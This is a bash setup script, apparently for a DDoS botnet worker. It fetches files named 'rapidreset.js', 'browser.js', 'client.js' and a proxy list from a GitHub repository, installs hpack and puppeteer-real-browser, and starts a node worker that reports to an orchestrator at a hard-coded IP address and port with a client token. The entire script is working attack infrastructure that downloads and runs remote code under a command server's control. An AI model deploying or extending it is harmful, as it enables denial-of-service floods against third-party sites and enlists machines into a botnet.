#!/usr/bin/env bash
set -euo pipefail

REPO="https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main"
ORCHESTRATOR="${ORCHESTRATOR:-http://78.154.103.52:9215}"
CLIENT_TOKEN="${CLIENT_TOKEN:-}"
MAX_CONCURRENT="${MAX_CONCURRENT:-1}"
WORKER_NAME="${WORKER_NAME:-$(hostname)}"

DIR="${1:-}"

# Jejak yang sudah ada dipakai apa adanya. Dijalankan dari dalam folder worker,
# script tetap bekerja di folder itu dan tidak membuat bot/bot.
if [ -z "$DIR" ]; then
  if [ -d bot ] && [ ! -f client.js ]; then
    DIR="bot"
  else
    DIR="."
  fi
fi

for bin in node npm curl; do
  command -v "$bin" >/dev/null 2>&1 || { echo "missing dependency: $bin" >&2; exit 1; }
done

mkdir -p "$DIR"
cd "$DIR"

echo "fetching worker files into $PWD"
curl -fsSLO "$REPO/bot/client.js"
curl -fsSLO "$REPO/bot/rapidreset.js"
curl -fsSLO "$REPO/bot/browser.js"
curl -fsSLO "$REPO/bot/proxi.txt"

if [ -d node_modules/hpack ] && [ -d node_modules/puppeteer-real-browser ]; then
  echo "dependencies already installed"
else
  echo "installing dependencies (puppeteer-real-browser pulls a Chromium, this takes a while)"
  npm i hpack puppeteer-real-browser --no-audit --no-fund
fi

echo "starting worker against $ORCHESTRATOR"
ORCHESTRATOR="$ORCHESTRATOR" \
CLIENT_TOKEN="$CLIENT_TOKEN" \
MAX_CONCURRENT="$MAX_CONCURRENT" \
WORKER_NAME="$WORKER_NAME" \
exec node client.js
